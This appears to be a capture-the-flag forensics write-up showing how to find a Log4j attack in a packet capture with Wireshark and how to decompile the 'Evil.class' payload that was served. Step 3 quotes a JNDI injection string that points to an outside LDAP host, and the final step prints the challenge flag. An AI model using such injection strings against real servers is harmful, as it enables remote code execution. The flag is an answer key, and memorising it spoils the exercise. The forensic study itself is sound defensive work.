# Log4jVulnExtra | Difficulty: Hard

## Requirements:

- Anaylzing PCAP file using software like Wireshark
- Base understanding about Log4J CVE-2021-45105 and how attacks are done

---

## Steps:

1.  Open `packets.pcap` using any packet analysis software you want. I will be using `Wireshark`.
2.  Identify that a potential Log4J attack might have occured.

    You can determine this by searching for any packets using the `LDAP` protocol or whether any IPs contains the word `jndi` in them.

    *[Image: LDAP search]*
    *[Image: jdni search]*

3.  Examine the suspicious HTTP request.

    From our search for whether any IP contains jndi, we noticed a suspicious packet.\
    Let us examine this packet further.

    You can right-click on the packet in `Wireshark` and select the option: `Follow -> HTTP Stream`.

    *[Image: Follow stream]*

    From this we can extract only one piece of information:

    ```
    ${jndi:ldap://52.221.178.168:389/Basic/Command/Base64/V2hhdCBlbHNlIGNvdWxkIHRoZXJlIGJlPw==}
    ```

    However after decoding this as `base64`, we realize it leads to nothing:

    ```
    V2hhdCBlbHNlIGNvdWxkIHRoZXJlIGJlPw==
    ```

    Using any decoder you wish results in this:

    ```
    What else could there be?
    ```

    Which does not give us anything.

4.  After more digging we notice a series of HTTP packets.

    *[Image: Http Packets]*

    It seems that the LDAP request was redirected to a HTTP request which returned an object, `Evil.class`.

    We can export this object straight from `Wireshark`.\
    Go to `File -> Export Objects -> HTTP...`:

    *[Image: Export Evil.class]*

5.  Use a `Java Decompiler` to decompile and view the contents of `Evil.class`.

    I will be using an online decompiler which is found [here](http://www.javadecompilers.com/).

    After successfully decompiling the Java class, here is our result:

    *[Image: Evil.class decompiled]*

    Success! We have found our flag.

        flag@java_class_decompiled
